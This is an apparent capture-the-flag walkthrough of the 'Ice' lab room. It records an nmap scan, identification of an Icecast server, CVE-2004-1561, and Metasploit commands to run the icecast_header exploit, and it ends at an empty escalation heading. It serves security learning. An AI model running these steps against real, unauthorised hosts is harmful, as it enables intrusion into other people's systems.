# Ice

## Recon
Just started off with an aggressive, all ports scan
`sudo nmap -A -vvv -p- -oN aggressivenmapallports {machine ip}`

### What port is Microsoft Remote desktop on?
Had to search the ports for this as the service name/version didn't specify (not sure if this is always the case?)
port 3389 had service 'ssl/ms-wbt-server?', which when googled found that it was microsoft remote desktop.

### What service is runing on port 8000?
Icecast streaming media server 

### What does nmap identify as the hostname of the machine? 
dark-pc

## Gain access
### What type of vulnerability is the cvedetails listing with a score of 7.5 for this version of icecast?
Couldn't actually find a listing of the version of icecast in my scan, but just tried a few vulnerabilities and found the one in question:
'execute code overflow'

### What's the cve number for this vulnerability?
CVE-2004-1561

### What's the metasploit path for this exploit?
`msfconsole`
`search icecast`
only one result, exploit/windows/http/icecast_header
`use 0`

### What is the only required setting that is blank for the exploit?
`show options`
ans is RHOSTS and the RPORT is already correct so we:
`set RHOSTS <machine ip>`
`exploit`

## Escalate
### 
